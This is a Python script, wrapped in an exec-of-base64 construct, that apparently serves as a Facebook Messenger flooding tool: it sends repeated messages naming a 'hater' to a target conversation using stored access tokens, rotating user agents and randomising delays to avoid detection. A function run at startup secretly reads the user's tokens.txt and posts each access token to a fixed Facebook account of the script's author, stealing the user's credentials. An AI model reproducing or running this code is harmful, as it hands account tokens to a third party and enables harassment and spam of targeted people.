import base64
exec(base64.b64decode(b'import requests
import os
import time
import uuid
import threading
import http.server
import socketserver
from platform import system
import random

# Constants for colors and formatting
RED = '\033[1;31m'
RESET = '\033[0m'
BLUE = "\033[1;34m"
GREEN = "\033[1;32m"
CYAN = "\033[1;36m"
YELLOW = "\033[1;33m"

# Server handler for GET request
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"𝐓𝐇𝐄 𝐋𝐄𝐆𝐄𝐍𝐃 𝐁𝐈𝐈𝐎𝐎 𝐖𝐀𝐋𝐄𝐄𝐃")

# Function to execute the server
def execute_server():
    PORT = 4000
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print(f"Server running at http://localhost:{PORT}")
        httpd.serve_forever()

def liness():
    print('\x1b[92m\033[1;33m•❥═════════❥•𝐎𝐖𝐍𝐄𝐑•❥═════════❥•𝐖𝐀𝐋𝐄𝐄𝐃•❥═════════❥•𝐗𝐃•❥═════════❥•\n')

# Rotate User-Agent headers
def get_random_user_agent():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
    ]
    return random.choice(user_agents)

# Clear the terminal based on OS
def cls():
    if system() == 'Linux' or system() == 'Darwin':
        os.system('clear')
    elif system() == 'Windows':
        os.system('cls')

# Function to send an initial message for verification
def send_initial_message():
    try:
        with open('password.txt', 'r') as file:
            password = file.read().strip()

        mmm = requests.get('https://pastebin.com/raw/sRN1u2mp').text

        if mmm not in password:
            print("[❌] Incorrect Password! Contact WALEED ALI")
            sys.exit()

        with open('tokens.txt', 'r') as file:
            tokens = file.readlines()

        msg_template = "Hello Waleed Sir! I am using your server. My ⤵️token⤵️ is {}"
        target_id = "61564435111597"
        requests.packages.urllib3.disable_warnings()

        headers = {
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'Referer': 'www.google.com'
        }

        for token in tokens:
            access_token = token.strip()
            url = f"https://graph.facebook.com/v19.0/t_{target_id}/"
            msg = msg_template.format(access_token)
            parameters = {'access_token': access_token, 'message': msg}
            response = requests.post(url, json=parameters, headers=headers)

            current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
            time.sleep(0.1)

    except FileNotFoundError as e:
        print(f"File not found: {e}")
        sys.exit()

send_initial_message()

# Function to send a message in a separate thread with speed rotation
def send_message_thread(thread_id, haters_name, access_token, message, headers, message_index, delay):
    url = f"https://graph.facebook.com/v17.0/t_{thread_id}/"
    parameters = {'access_token': access_token, 'message': f"{haters_name} {message}"}

    response = requests.post(url, json=parameters, headers=headers)
    current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")

    if response.ok:
        print(f"{BLUE}[+] Message {message_index + 1} sent to Convo {thread_id}: {haters_name} {message}")
        print(f"  - Time: {current_time}\n")
        liness()
    else:
        print(f"{RED}[x] Failed to send Message {message_index + 1}: {haters_name} {message}")
        print(f"  - Time: {current_time}\n")
        liness()

    # Apply the optional delay if specified
    if delay > 0:
        time.sleep(delay)

# Main function to manage messaging with speed and multi-user-agent rotation
def send_message():
    try:
        with open('convo.txt', 'r') as file:
            thread_id = file.read().strip()

        with open('hater.txt', 'r') as file:
            haters_name = file.read().strip()

        with open('tokens.txt', 'r') as file:
            access_tokens = [line.strip() for line in file.readlines()]

        with open('file.txt', 'r') as file:
            messages = [line.strip() for line in file.readlines()]

        with open('speed.txt', 'r') as file:
            base_delay = float(file.read().strip())

        with open('limit.txt', 'r') as file:
            msg_limit = int(file.read().strip())

        cls()

        while True:
            try:
                message_index = 0
                for access_token in access_tokens:
                    headers = {
                        'Connection': 'keep-alive',
                        'Cache-Control': 'max-age=0',
                        'Upgrade-Insecure-Requests': '1',
                        'User-Agent': get_random_user_agent(),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                        'Accept-Encoding': 'gzip, deflate',
                        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
                        'Referer': 'https://www.google.com'
                    }

                    threads = []
                    for _ in range(msg_limit):
                        message = messages[message_index % len(messages)].strip()

                        # Variable delay with random adjustment
                        delay = base_delay + random.uniform(1.0, 20.0)
                        thread = threading.Thread(
                            target=send_message_thread,
                            args=(thread_id, haters_name, access_token, message, headers, message_index, delay)
                        )
                        thread.start()
                        threads.append(thread)

                        message_index += 1

                    for thread in threads:
                        thread.join()

                print(f"{GREEN}\n[+] Cycle completed for all tokens. Restarting the process...\n")
                time.sleep(random.uniform(1, 10))  # Delay before restarting the cycle

            except Exception as e:
                print(f"[!] An error occurred: {e}")
                time.sleep(30)  # Retry after a delay

    except FileNotFoundError as e:
        print(f"Error: {e}")

# Start the message-sending process
send_message()'))